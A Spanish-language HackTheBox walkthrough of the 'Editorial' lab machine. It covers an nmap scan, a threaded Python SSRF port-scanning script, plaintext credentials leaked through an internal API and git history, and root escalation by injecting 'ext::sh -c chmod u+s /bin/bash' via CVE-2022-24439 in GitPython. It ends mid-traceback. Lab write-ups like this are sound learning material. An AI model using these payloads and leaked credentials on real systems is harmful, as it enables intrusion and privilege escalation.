<!DOCTYPE html>
<html lang="en">







<head>
  






  
    
<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Editorial | Armando Villalobos</title>
<meta name="generator" content="Jekyll v3.9.5" />
<meta property="og:title" content="Editorial" />
<meta name="author" content="<firstname> <lastname>" />
<meta property="og:locale" content="en" />
<meta name="description" content="Los primero pasos es escanear la máquina para saber que puertos están abiertos." />
<meta property="og:description" content="Los primero pasos es escanear la máquina para saber que puertos están abiertos." />
<link rel="canonical" href="http://localhost:4000/machines/editorial.html" />
<meta property="og:url" content="http://localhost:4000/machines/editorial.html" />
<meta property="og:site_name" content="Armando Villalobos" />
<meta property="og:image" content="http://localhost:4000/assets/img/machines/editorial/logo.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-06-23T00:00:00-06:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/machines/editorial/logo.png" />
<meta property="twitter:title" content="Editorial" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"<firstname> <lastname>"},"dateModified":"2024-06-23T00:00:00-06:00","datePublished":"2024-06-23T00:00:00-06:00","description":"Los primero pasos es escanear la máquina para saber que puertos están abiertos.","headline":"Editorial","image":"http://localhost:4000/assets/img/machines/editorial/logo.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/machines/editorial.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.png"},"name":"<firstname> <lastname>"},"url":"http://localhost:4000/machines/editorial.html"}</script>
<!-- End Jekyll SEO tag -->


  

  



  <meta name="theme-color" content="rgb(25,55,71)">


<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta http-equiv="x-ua-compatible" content="ie=edge">

<meta name="mobile-web-app-capable" content="yes">

<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-title" content="Armando Villalobos">
<meta name="apple-mobile-web-app-status-bar-style" content="default">

<meta name="application-name" content="Armando Villalobos">

<meta name="generator" content="Hydejack v9.1.6" />


<link rel="alternate" href="http://localhost:4000/machines/editorial.html" hreflang="en">

<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Armando Villalobos" />


<link rel="shortcut icon"    href="/assets/icons/favicon.ico">
<link rel="apple-touch-icon" href="/assets/icons/icon-192x192.png">

<link rel="manifest" href="/assets/site.webmanifest">

<link rel="dns-prefetch" href="https://fonts.googleapis.com"><link rel="dns-prefetch" href="https://fonts.gstatic.com">



<link rel="preload" href="/assets/img/swipe.svg" as="image" id="_hrefSwipeSVG">

<link rel="dns-prefetch" href="/assets/js/search-worker-9.1.6.js" as="worker" id="_hrefSearch">





<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
<script src="/assets/js/sidebar-folder.js"></script>


<script>!function(r,c){"use strict";function a(e,t,n,o){e.addEventListener?e.addEventListener(t,n,o):e.attachEvent?e.attachEvent("on"+t,n):e["on"+t]=n}r.loadJS=function(e,t){var n=c.createElement("script"),e=(n.src=e,t&&a(n,"load",t,{once:!0}),c.scripts[0]);return e.parentNode.insertBefore(n,e),n},r._loaded=!1,r.loadJSDeferred=function(e,t){var n=c.createElement("script");function o(){r._loaded=!0,t&&a(n,"load",t,{once:!0});var e=c.scripts[0];e.parentNode.insertBefore(n,e)}return n.src=e,r._loaded?o():a(r,"load",o,{once:!0}),n},r.setRel=r.setRelStylesheet=function(e){a(c.getElementById(e),"load",function(){this.rel="stylesheet"},{once:!0})}}(window,document);
!function(a){"use strict";var b=function(b,c,d){function e(a){return h.body?a():void setTimeout(function(){e(a)})}function f(){i.addEventListener&&i.removeEventListener("load",f),i.media=d||"all"}var g,h=a.document,i=h.createElement("link");if(c)g=c;else{var j=(h.body||h.getElementsByTagName("head")[0]).childNodes;g=j[j.length-1]}var k=h.styleSheets;i.rel="stylesheet",i.href=b,i.media="only x",e(function(){g.parentNode.insertBefore(i,c?g:g.nextSibling)});var l=function(a){for(var b=i.href,c=k.length;c--;)if(k[c].href===b)return a();setTimeout(function(){l(a)})};return i.addEventListener&&i.addEventListener("load",f),i.onloadcssdefined=l,l(f),i};"undefined"!=typeof exports?exports.loadCSS=b:a.loadCSS=b}("undefined"!=typeof global?global:this);
!function(a){if(a.loadCSS){var b=loadCSS.relpreload={};if(b.support=function(){try{return a.document.createElement("link").relList.supports("preload")}catch(b){return!1}},b.poly=function(){for(var b=a.document.getElementsByTagName("link"),c=0;c<b.length;c++){var d=b[c];"preload"===d.rel&&"style"===d.getAttribute("as")&&(a.loadCSS(d.href,d,d.getAttribute("media")),d.rel=null)}},!b.support()){b.poly();var c=a.setInterval(b.poly,300);a.addEventListener&&a.addEventListener("load",function(){b.poly(),a.clearInterval(c)}),a.attachEvent&&a.attachEvent("onload",function(){a.clearInterval(c)})}}}(this);
!function(w) {
  w._baseURL = '/';
  w._publicPath = '/assets/js/';
  w._noPushState = false;
  w._noDrawer = false;
  w._noNavbar = false;
  w._noToc = false;
  w._noSearch = false;
  w._advertise = false;
  w._search = {
    DATA_URL: '/assets/sitedata.json?no-cache',
    STORAGE_KEY: 'mini-search/',
    INDEX_KEY: 'index--2024-06-24T12:56:15-06:00',
  };
  w._clapButton = true;
}(window);</script>


<script async src="/assets/bower_components/MathJax/es5/tex-mml-chtml.js" id="_MathJax"></script>


<!--[if gt IE 8]><!---->

  




<link rel="stylesheet" href="/assets/css/hydejack-9.1.6.css" id="_stylePreload">
<link rel="stylesheet" href="/assets/icomoon/style.css" id="_iconsPreload">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab:700%7CNoto+Sans:400,400i,700,700i&display=swap" id="_fontsPreload">



  <style id="_pageStyle">

html{--accent-color: rgb(79,177,186);--accent-color-faded: rgba(79,177,186,0.5);--accent-color-highlight: rgba(79,177,186,0.1);--accent-color-darkened: #409ba3;--theme-color: rgb(25,55,71);--dark-mode-body-bg: #2a2d2f;--dark-mode-border-color: #363a3d}

</style>


<!--<![endif]-->





</head>

<body class="no-break-layout">
  
<script>
  window._sunrise = 6;
  window._sunset =  18;
  !function(e,s){var d="light-mode",o="dark-mode",a=(new Date).getHours();"matchMedia"in e&&e.matchMedia("(prefers-color-scheme)")||(e=(a=a<=e._sunrise||a>=e._sunset?o:d)==o?d:o,s.body.classList.add(a),s.body.classList.remove(e))}(window,document);

</script>



<hy-push-state
  id="_pushState"
  replace-selector="#_main"
  link-selector="a[href]:not([href^='/assets/']):not(.external):not(.no-push-state)"
  script-selector="script"
  duration="500"
  hashchange
>
  
  
  <div id="_navbar" class="navbar fixed-top">
  <div class="content">
    <span class="sr-only">Jump to:</span>
    <div class="nav-btn-bar">
      <a id="_menu" class="nav-btn no-hover" href="#_drawer--opened">
        <span class="sr-only">Navigation</span>
        <span class="icon-menu"></span>
      </a>
      <div class="nav-span"></div>
    </div>
  </div>
</div>
<hr class="sr-only" hidden />

  <main
  id="_main"
  class="content layout-post"
  role="main"
>
  <nav id="breadcrumbs" class="screen-only"><ul>
  
  
    <li><a href="/">home</a></li>
    
      <li>
        
          <span>/</span>
          
          
          <a href="/machines/">machines</a>
        
      </li>
    
      <li>
        
          <span>/</span>
          <span>editorial.html</span>
        
      </li>
    
  
</ul></nav>
  










<article id="post-machines-editorial" class="page post mb6" role="article">
  <header>
    <h1 class="post-title flip-project-title">
      
        Editorial
      
    </h1>

    <div class="post-date">
      
      <span class="ellipsis mr1">
        <time datetime="2024-06-23T00:00:00-06:00">23 Jun 2024</time> in <a href="/blog/hackthebox/" class="flip-title">Machines</a> 
      </span>
      
        
      
    </div>

    
    
      
        <div class="img-wrapper lead aspect-ratio sixteen-nine flip-project-img">
          


<img
  
    src="/assets/img/machines/editorial/logo.png"
  
  alt="Editorial"
  
  
  width="864"
  height="486"
  loading="lazy"
/>

        </div>
      
      
    

    



  


  </header>

  
    <p>Los primero pasos es escanear la máquina para saber que puertos están abiertos.</p>

<pre><code class="language-cmd"># Nmap 7.93 scan initiated Sun Jun 23 19:10:57 2024 as: nmap -p22,80 -sCV -oN targeted 10.10.11.20
Nmap scan report for editorial.htb (10.10.11.20)
Host is up (0.079s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0dedb29ce253fbd4c8c1196e7580d864 (ECDSA)
|_  256 0fb9a7510e00d57b5b7c5fbf2bed53a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 23 19:11:07 2024 -- 1 IP address (1 host up) scanned in 9.78 seconds
</code></pre>
<p>Revisando el puerto 80 vemos que tenemos un sitio web donde podemos subir un archivo de texto. En este nos muestra dos opciones: <code class="language-plaintext highlighter-rouge">url</code> y <code class="language-plaintext highlighter-rouge">adjuntando</code>. Siempre que tenemos un campo donde podemos apuntar a alguna URL es recomendable probar un ataque de <code class="language-plaintext highlighter-rouge">SSRF</code>.</p>

<p><img src="/assets/img/machines/editorial/editorial1.jpg" alt="imagen1" /></p>

<p><img src="/assets/img/machines/editorial/editorial2.jpg" alt="imagen2" /></p>

<p>Procedemos a interceptar la petición con <code class="language-plaintext highlighter-rouge">Burpsuite</code>, podemos ver que se manda una petición <code class="language-plaintext highlighter-rouge">POST</code>. Al intentar apuntar a la máquina local, vemos que no tienen ningun bloqueo. Intentar puerto por puerto manualmente nos llevará bastante tiempo, por lo que, creé un script en python para hacer este trabajo.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">pwn</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">import</span> <span class="nn">queue</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">"http://editorial.htb/upload-cover"</span>
<span class="n">proxy</span> <span class="o">=</span> <span class="p">{</span><span class="s">"http"</span><span class="p">:</span><span class="s">"127.0.0.1:8080"</span><span class="p">}</span>
<span class="n">header</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Content-Type"</span><span class="p">:</span><span class="s">"multipart/form-data; boundary=----WebKitFormBoundaryxCyQMtVBFzp73HTl"</span><span class="p">}</span>
<span class="n">pwnlogs</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">log</span>

<span class="k">def</span> <span class="nf">fuzzing</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">)</span>
    <span class="n">clength</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"Content-Length"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">clength</span>

<span class="k">def</span> <span class="nf">worker</span><span class="p">(</span><span class="n">port_queue</span><span class="p">):</span>
    <span class="k">while</span> <span class="ow">not</span> <span class="n">port_queue</span><span class="p">.</span><span class="n">empty</span><span class="p">():</span>
        <span class="n">i</span> <span class="o">=</span> <span class="n">port_queue</span><span class="p">.</span><span class="n">get</span><span class="p">()</span>
        <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"""------WebKitFormBoundaryxCyQMtVBFzp73HTl</span><span class="se">\n</span><span class="s">Content-Disposition: form-data; name="bookurl"</span><span class="se">\n\n</span><span class="s">http://127.0.0.1:</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="se">\n</span><span class="s">------WebKitFormBoundaryxCyQMtVBFzp73HTl</span><span class="se">\n</span><span class="s">Content-Disposition: form-data; name="bookfile"; filename=""</span><span class="se">\n</span><span class="s">Content-Type: application/octet-stream</span><span class="se">\n\n\n</span><span class="s">------WebKitFormBoundaryxCyQMtVBFzp73HTl--"""</span>

        <span class="n">response_length</span> <span class="o">=</span> <span class="n">fuzzing</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">response_length</span> <span class="o">!=</span> <span class="s">"61"</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Puerto:</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> encontrado"</span><span class="p">)</span>

        <span class="n">port_queue</span><span class="p">.</span><span class="n">task_done</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">pwnlogs</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Iniciando fuerza bruta"</span><span class="p">)</span>
    <span class="n">progress</span> <span class="o">=</span> <span class="n">pwnlogs</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Probando puertos"</span><span class="p">)</span>

    <span class="n">port_queue</span> <span class="o">=</span> <span class="n">queue</span><span class="p">.</span><span class="n">Queue</span><span class="p">()</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">65535</span><span class="p">):</span>
        <span class="n">port_queue</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

    <span class="n">num_threads</span> <span class="o">=</span> <span class="mi">30</span>
    <span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_threads</span><span class="p">):</span>
        <span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">worker</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">port_queue</span><span class="p">,))</span>
        <span class="n">thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
        <span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">thread</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">thread</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
        <span class="n">thread</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div></div>
<p>Para este script utilizamos hilos para que haga más rápido el trabajo, el ejecutarlo nos encontramo con lo siguiente.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guero@guero<span class="nv">$ </span>python3 exploit.py
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Iniciando fuerza bruta
<span class="o">[</span>&lt;<span class="o">]</span> Probando puertos
Puerto:5000 encontrado
</code></pre></div></div>
<p>Vemos que pasa cuando ponemos este puerto en la petición de burpsuite.Nos arroja una liga donde podemos descargar un archivo. Para esto lo intenté unas cuántas veces porque me daba errores la liga.</p>

<p><img src="/assets/img/machines/editorial/editorial3.jpg" alt="imagen3" /></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guero@guero<span class="nv">$ </span>wget http://editorial.htb/static/uploads/33bf0431-5b5e-4d19-896a-1f18aa797401
<span class="nt">--2024-06-23</span> 19:29:56--  http://editorial.htb/static/uploads/33bf0431-5b5e-4d19-896a-1f18aa797401
Resolving editorial.htb <span class="o">(</span>editorial.htb<span class="o">)</span>... 10.10.11.20
Connecting to editorial.htb <span class="o">(</span>editorial.htb<span class="o">)</span>|10.10.11.20|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 911 <span class="o">[</span>application/octet-stream]
Saving to: ‘33bf0431-5b5e-4d19-896a-1f18aa797401’

33bf0431-5b5e-4d19-896a-1f18aa797401       100%[<span class="o">======================================================================================&gt;]</span>     911  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      

2024-06-23 19:29:56 <span class="o">(</span>122 MB/s<span class="o">)</span> - ‘33bf0431-5b5e-4d19-896a-1f18aa797401’ saved <span class="o">[</span>911/911]
</code></pre></div></div>
<p>Nos encontramos con un archivo que contiene datos de alguna api</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guero@guero<span class="nv">$ </span><span class="nb">cat </span>33bf0431-5b5e-4d19-896a-1f18aa797401 | jq
<span class="o">{</span>
  <span class="s2">"messages"</span>: <span class="o">[</span>
    <span class="o">{</span>
      <span class="s2">"promotions"</span>: <span class="o">{</span>
        <span class="s2">"description"</span>: <span class="s2">"Retrieve a list of all the promotions in our library."</span>,
        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata/messages/promos"</span>,
        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"coupons"</span>: <span class="o">{</span>
        <span class="s2">"description"</span>: <span class="s2">"Retrieve the list of coupons to use in our library."</span>,
        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata/messages/coupons"</span>,
        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"new_authors"</span>: <span class="o">{</span>
        <span class="s2">"description"</span>: <span class="s2">"Retrieve the welcome message sended to our new authors."</span>,
        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata/messages/authors"</span>,
        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"platform_use"</span>: <span class="o">{</span>
        <span class="s2">"description"</span>: <span class="s2">"Retrieve examples of how to use the platform."</span>,
        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata/messages/how_to_use_platform"</span>,
        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">]</span>,
  <span class="s2">"version"</span>: <span class="o">[</span>
    <span class="o">{</span>
      <span class="s2">"changelog"</span>: <span class="o">{</span>
        <span class="s2">"description"</span>: <span class="s2">"Retrieve a list of all the versions and updates of the api."</span>,
        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata/changelog"</span>,
        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"latest"</span>: <span class="o">{</span>
        <span class="s2">"description"</span>: <span class="s2">"Retrieve the last version of api."</span>,
        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata"</span>,
        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">]</span>
<span class="o">}</span>
</code></pre></div></div>
<p>Realizamos el mismo procedimiento para ver estos endpoints</p>

<p><img src="/assets/img/machines/editorial/editorial4.jpg" alt="imagen4" /></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guero@guero<span class="nv">$ </span>curl <span class="nt">-s</span> http://editorial.htb/static/uploads/86f4bfec-ccce-4ab3-b012-0901752e0318  | jq
<span class="o">{</span>
  <span class="s2">"template_mail_message"</span>: <span class="s2">"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.</span><span class="se">\n\n</span><span class="s2">Your login credentials for our internal forum and authors site are:</span><span class="se">\n</span><span class="s2">Username: dev</span><span class="se">\n</span><span class="s2">Password: dev080217_devAPI!@</span><span class="se">\n</span><span class="s2">Please be sure to change your password as soon as possible for security purposes.</span><span class="se">\n\n</span><span class="s2">Don't hesitate to reach out if you have any questions or ideas - we're always here to support you.</span><span class="se">\n\n</span><span class="s2">Best regards, Editorial Tiempo Arriba Team."</span>
<span class="o">}</span>
</code></pre></div></div>
<p>Nos encontramos con un usuario y contraseña, al probarlo con ssh podemos entrar al sistema.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh dev@editorial.htb 
The authenticity of host <span class="s1">'editorial.htb (10.10.11.20)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>editorial.htb<span class="s1">' (ED25519) to the list of known hosts.
dev@editorial.htb'</span>s password: 
Welcome to Ubuntu 22.04.4 LTS <span class="o">(</span>GNU/Linux 5.15.0-112-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/pro

 System information as of Mon Jun 24 01:43:24 AM UTC 2024

  System load:           0.0
  Usage of /:            61.5% of 6.35GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             224
  Users logged <span class="k">in</span>:       0
  IPv4 address <span class="k">for </span>eth0: 10.10.11.20
  IPv6 address <span class="k">for </span>eth0: dead:beef::250:56ff:feb0:e7c3

</code></pre></div></div>
<p>Dentro encontramos la carpeta app y dentro encontramos un archivo .git, al tener el programa instalado en la máquina podemos ver los logs históricos, en uno de ellos podemos ver la contraseña del usuario prod.</p>

<pre><code class="language-git">-bash-5.1$ ls -la
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
drwxr-x--- 4 dev dev 4096 Jun  5 14:36 ..
drwxr-xr-x 8 dev dev 4096 Jun 24 01:45 .git
-bash-5.1$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -&gt; master)
Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

&lt;SNIP&gt;

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app

-bash-5.1$ git diff 1e84a036b2f33c59e2390730699a488c65643d28
diff --git a/app_api/app.py b/app_api/app.py
deleted file mode 100644
index 61b786f..0000000
--- a/app_api/app.py
+++ /dev/null
@@ -1,74 +0,0 @@
--- a/app_api/app.py
+++ /dev/null
@@ -1,74 +0,0 @@
-# API (in development).
-# * To retrieve info about editorial
-
-import json
-from flask import Flask, jsonify
-
-# -------------------------------
-# App configuration
-# -------------------------------
-app = Flask(__name__)
-
-# -------------------------------
-# Global Variables
-# -------------------------------
-api_route = "/api/latest/metadata"
-api_editorial_name = "Editorial Tiempo Arriba"
-api_editorial_email = "info@tiempoarriba.htb"
-
-# -------------------------------
-# API routes
-# -------------------------------
-# -- : home
-@app.route('/api', methods=['GET'])
-def index():
-    data_editorial = {
-        'version': [{
-            '1': {
-                'editorial': 'Editorial El Tiempo Por Arriba', 
-                'contact_email_1': 'soporte@tiempoarriba.oc',
-                'contact_email_2': 'info@tiempoarriba.oc',
-                'api_route': '/api/v1/metadata/'
-            }},
-            {
-            '1.1': {
-                'editorial': 'Ed Tiempo Arriba', 
-                'contact_email_1': 'soporte@tiempoarriba.oc',
-                'contact_email_2': 'info@tiempoarriba.oc',
-                'api_route': '/api/v1.1/metadata/'
-            }},
-            {
-            '1.2': {
-                'editorial': api_editorial_name, 
-                'contact_email_1': 'soporte@tiempoarriba.oc',
-                'contact_email_2': 'info@tiempoarriba.oc',
-                'api_route': f'/api/v1.2/metadata/'
-            }},
-            {
-            '2': {
-                'editorial': api_editorial_name, 
-                'contact_email': 'info@tiempoarriba.moc.oc',
-                'api_route': f'/api/v2/metadata/'
-            }},
-            {
-            '2.3': {
-                'editorial': api_editorial_name, 
-                'contact_email': api_editorial_email,
-                'api_route': f'{api_route}/'
-            }
-        }]
-    }
-    return jsonify(data_editorial)
-
-# -- : (development) mail message to new authors
-            }},
-            {
-            '2': {
-                'editorial': api_editorial_name, 
-                'contact_email': 'info@tiempoarriba.moc.oc',
-                'api_route': f'/api/v2/metadata/'
-            }},
-            {
-            '2.3': {
-                'editorial': api_editorial_name, 
-                'contact_email': api_editorial_email,
-                'api_route': f'{api_route}/'
-            }
-        }]
-    }
-    return jsonify(data_editorial)
-
-# -- : (development) mail message to new authors
-@app.route(api_route + '/authors/message', methods=['GET'])
-def api_mail_new_authors():
-    return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
-    }) # TODO: replace dev credentials when checks pass
-
-# -------------------------------
-# Start program
-# -------------------------------
-if __name__ == '__main__':
-    app.run(host='127.0.0.1', port=5001, debug=True)
</code></pre>
<p>Con estas contraseñas podemos cambiar al usuario <code class="language-plaintext highlighter-rouge">prod</code> y viendo sus permisos sudo vemos lo siguiente:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-5</span>.1<span class="nv">$ </span>su prod
Password: 
bash-5.1<span class="nv">$ </span><span class="nb">whoami
</span>prod
bash-5.1<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>prod: 
Matching Defaults entries <span class="k">for </span>prod on editorial:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty

User prod may run the following commands on editorial:
    <span class="o">(</span>root<span class="o">)</span> /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span class="k">*</span>
</code></pre></div></div>
<p>Este script contiene lo siguiente:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">git</span> <span class="kn">import</span> <span class="n">Repo</span>

<span class="n">os</span><span class="p">.</span><span class="n">chdir</span><span class="p">(</span><span class="s">'/opt/internal_apps/clone_changes'</span><span class="p">)</span>

<span class="n">url_to_clone</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">Repo</span><span class="p">.</span><span class="n">init</span><span class="p">(</span><span class="s">''</span><span class="p">,</span> <span class="n">bare</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">clone_from</span><span class="p">(</span><span class="n">url_to_clone</span><span class="p">,</span> <span class="s">'new_changes'</span><span class="p">,</span> <span class="n">multi_options</span><span class="o">=</span><span class="p">[</span><span class="s">"-c protocol.ext.allow=always"</span><span class="p">])</span>
</code></pre></div></div>
<p>Investigando un poco nos encontramos con la vulnerabilidad <a href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858">CVE-2022-24439</a>, realizamos lo siguiente para obtener una bash con privilegios.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.1<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span class="s1">'ext::sh -c chmod% u+s /bin/bash'</span>
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"/opt/internal_apps/clone_changes/clone_prod_change.py"</span>, line 12, <span class="k">in</span> &lt;module&gt;
    r.clone_from<span class="o">(</span>url_to_clone, <span class="s1">'new_changes'</span>, <span class="nv">multi_options</span><span class="o">=[</span><span class="s2">"-c protocol.ext.allow=always"</span><span class="o">])</span>
  File <span class="s2">"/usr/local/lib/python3.10/dist-packages/git/repo/base.py"</span>, line 1275, <span class="k">in </span>clone_from
    <span class="k">return </span>cls._clone<span class="o">(</span>git, url, to_path, GitCmdObjectDB, progress, multi_options, <span class="k">**</span>kwargs<span class="o">)</span>
  File <span class="s2">"/usr/local/lib/python3.10/dist-packages/git/repo/base.py"</span>, line 1194, <span class="k">in </span>_clone
